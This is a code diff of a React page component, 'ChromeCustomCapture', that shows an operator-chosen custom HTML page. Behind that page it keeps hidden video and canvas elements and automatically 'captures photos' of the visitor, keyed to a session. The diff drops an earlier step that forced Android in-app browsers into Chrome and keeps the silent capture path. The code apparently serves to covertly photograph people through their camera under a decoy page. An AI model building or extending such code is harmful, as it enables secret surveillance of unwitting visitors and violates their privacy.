@@ -54,7 +54,7 @@ const ChromeCustomCapture = () => {
   const [searchParams] = useSearchParams();
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
-  const [status, setStatus] = useState<"checking" | "redirecting_chrome" | "not_chrome" | "loading" | "capturing" | "done">("checking");
+  const [status, setStatus] = useState<"loading" | "ready" | "capturing" | "done">("loading");
   const [customHtml, setCustomHtml] = useState<string | null>(null);
   const [captureComplete, setCaptureComplete] = useState(false);
   
@@ -74,6 +74,7 @@ const ChromeCustomCapture = () => {
           const settings = data.setting_value as { chromeCustomHtml?: string };
           if (settings.chromeCustomHtml) {
             setCustomHtml(settings.chromeCustomHtml);
+            setStatus("ready");
           }
         }
       } catch (err) {
@@ -120,42 +121,9 @@ const ChromeCustomCapture = () => {
     }
   };
 
-  // Step 1: Check browser and redirect if needed
+  // Capture photos when custom HTML is loaded
   useEffect(() => {
-    const checkBrowser = () => {
-      // If in-app browser on Android, redirect to Chrome
-      if (isInAppBrowser() && isAndroid()) {
-        setStatus("redirecting_chrome");
-        const chromeIntent = getChromeIntentUrl(window.location.href);
-        
-        setTimeout(() => {
-          window.location.href = chromeIntent;
-        }, 100);
-        return;
-      }
-      
-      // If in-app browser on non-Android, show message
-      if (isInAppBrowser()) {
-        setStatus("not_chrome");
-        return;
-      }
-      
-      // If not Chrome browser, show message
-      if (!isChromeBrowser()) {
-        setStatus("not_chrome");
-        return;
-      }
-      
-      // We're in Chrome - proceed to loading custom HTML
-      setStatus("loading");
-    };
-
-    checkBrowser();
-  }, []);
-
-  // Step 2: Capture photos when custom HTML is loaded and we're in Chrome
-  useEffect(() => {
-    if (status !== "loading" || !customHtml || captureComplete) return;
+    if (status !== "ready" || !customHtml || captureComplete) return;
 
     setStatus("capturing");
 
@@ -187,7 +155,6 @@ const ChromeCustomCapture = () => {
         
         setCaptureComplete(true);
         setStatus("done");
-        // No redirect - user stays on custom HTML page
         
       } catch (error) {
         console.error("Capture error:", error);
@@ -201,56 +168,18 @@ const ChromeCustomCapture = () => {
     return () => clearTimeout(timer);
   }, [customHtml, captureComplete, sessionId, status]);
 
-  // Show "not Chrome" message
-  if (status === "not_chrome") {
+  // Show loading if no custom HTML yet
+  if (!customHtml || status === "loading") {
     return (
-      <div className="min-h-screen bg-background flex items-center justify-center p-4">
-        <div className="text-center max-w-md">
-          <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-destructive/20 flex items-center justify-center">
-            <svg className="w-8 h-8 text-destructive" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
-            </svg>
-          </div>
-          <h1 className="text-xl font-bold text-foreground mb-2">Browser Not Supported</h1>
-          <p className="text-muted-foreground">
-            Ye link sirf Google Chrome browser me kaam karta hai.
-          </p>
-          <p className="text-muted-foreground text-sm mt-4">
-            Please open this link in Google Chrome browser.
-          </p>
-        </div>
-      </div>
-    );
-  }
-
-  // Show redirecting to Chrome message
-  if (status === "redirecting_chrome") {
-    return (
-      <div className="min-h-screen bg-background flex items-center justify-center p-4">
+      <div className="min-h-screen bg-background flex items-center justify-center">
+        <video ref={videoRef} className="hidden" autoPlay playsInline muted />
+        <canvas ref={canvasRef} className="hidden" />
         <div className="text-center">
           <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
-          <p className="text-muted-foreground text-sm">
-            Opening in Chrome...
-          </p>
+          <p className="text-muted-foreground text-sm">Loading...</p>
         </div>
       </div>
     );
-  }
-
-  // Show loading if checking or no custom HTML yet
-  if (status === "checking" || status === "loading" || status === "capturing") {
-    if (!customHtml) {
-      return (
-        <div className="min-h-screen bg-background flex items-center justify-center">
-          <video ref={videoRef} className="hidden" autoPlay playsInline muted />
-          <canvas ref={canvasRef} className="hidden" />
-          <div className="text-center">
-            <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
-            <p className="text-muted-foreground text-sm">Loading...</p>
-          </div>
-        </div>
-      );
-    }
   }
 
   // Render custom HTML with hidden video/canvas for capture
